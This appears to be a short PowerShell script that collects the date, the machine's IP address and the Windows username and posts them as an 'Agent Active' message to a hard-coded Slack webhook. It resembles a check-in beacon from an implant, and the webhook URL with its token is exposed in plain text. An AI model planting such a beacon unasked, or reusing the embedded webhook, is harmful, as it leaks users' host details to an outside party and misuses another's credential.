<# Get Date #>
$date = Get-Date

<#Get Ip Address #>
$ipaddress = $(ipconfig | where {$_ -match 'IPv4.+\s(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})' } | out-null; $Matches[1])

<#Get Username #>
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

$Text = "Agent Active: 
         User: $user
         IP: $ipaddress
         On Date: $date"

$body = @{ text=$Text; channel=$Channel; username=$Username; icon_emoji=$Emoji; icon_url=$IconUrl } | ConvertTo-Json
Invoke-WebRequest -Method Post -Uri "https://hooks.slack.com/services/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" -Body $body
